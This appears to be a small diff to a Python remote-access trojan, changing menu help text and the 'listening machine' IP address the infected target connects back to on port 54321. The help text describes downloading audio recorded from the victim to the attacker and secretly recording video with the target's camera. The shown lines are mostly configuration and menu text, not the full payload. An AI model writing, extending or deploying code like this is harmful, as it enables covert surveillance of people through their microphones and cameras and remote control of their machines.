@@ -88,7 +88,7 @@ def shell():
 
 \t(13) record\t\t\t:\tDownload the file of the recorded audio\n\t\t\t\t\t\tin the current directory of the attacker\n\t\t\t\t\t\tNote:- Only use after stopping Recorder!
 
-\t(14) start video\t\t\t:\tStart recording video using the primary camera\n\t\t\t\t\t\tof the target system
+\t(14) start video\t\t:\tStart recording video using the primary camera\n\t\t\t\t\t\tof the target system
 
 \t(15) stop video\t\t\t:\tStop recording the video
 
@@ -363,7 +363,7 @@ except Exception as e:
 	img_path = os.environ["HOME"] + "/Image.png"
 
 # details of the listening machine (connect to)
-connect_ip = "192.168.0.103"
+connect_ip = "192.168.0.107"
 conn_port = 54321
 
 stop_key = False
